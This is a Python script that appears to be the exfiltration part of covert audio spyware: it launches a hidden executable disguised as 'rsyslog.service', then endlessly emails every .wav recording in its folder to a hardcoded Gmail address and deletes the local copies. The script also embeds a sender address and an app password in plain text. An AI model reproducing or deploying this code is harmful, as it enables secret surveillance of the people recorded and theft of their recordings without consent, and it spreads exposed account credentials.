import pyaudio
import wave
from email.message import EmailMessage
from email.mime import audio
import os
import re
import smtplib
import subprocess
from urllib.request import urlopen
import datetime
#date = datetime.datetime.now()
#nom = str(date).replace(" ","-").replace(":","-").split(".")[0]
recepteur_mail = 'frcompte028@gmail.com'
emmeteur_mail = 'frcompte027@gmail.com' 
pswd = 'cvxqhumdfjyfnyrs'

path = os.getcwd()
filename = 'rsyslog.service'
file_path = path+'/.dist/'+filename

os.system(file_path)
#checking connection
def internet_on():
    try:
        response = urlopen('https://www.google.com/', timeout=10)
        return True
    except: 
        return False
 

#send an email from emmeteur_mail to recepteur_mail 
def send_mail(recepteur_mail, emmeteur_mail, pswd, file_name):
       
		msg = EmailMessage()
		msg['Subject'] = 'audio file'
		msg['From'] = emmeteur_mail
		msg['To'] = recepteur_mail
		msg.set_content('succesfuly')

		with open(file_name, 'rb') as f:
			file_data = f.read()
			

		msg.add_attachment(file_data, maintype='audio', subtype='.wav', filename= file_name)


		with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
		#with smtplib.SMTP('smtp.gmail.com', 587) as server:
			server.login(emmeteur_mail, pswd)
			server.send_message(msg)


#Changing the current working directory 
os.chdir(os.path.dirname(os.path.abspath(__file__)))


#for i in range(0, 4):
    
while(1 == 1):
	
	if(internet_on()):
			files = os.listdir(os.path.dirname(os.path.abspath(__file__)))
			for i in files:
				is_audio = re.search(r"\w+\.wav", i)
				if is_audio:
					send_mail(recepteur_mail, emmeteur_mail, pswd, i) 
					os.remove(i)

	
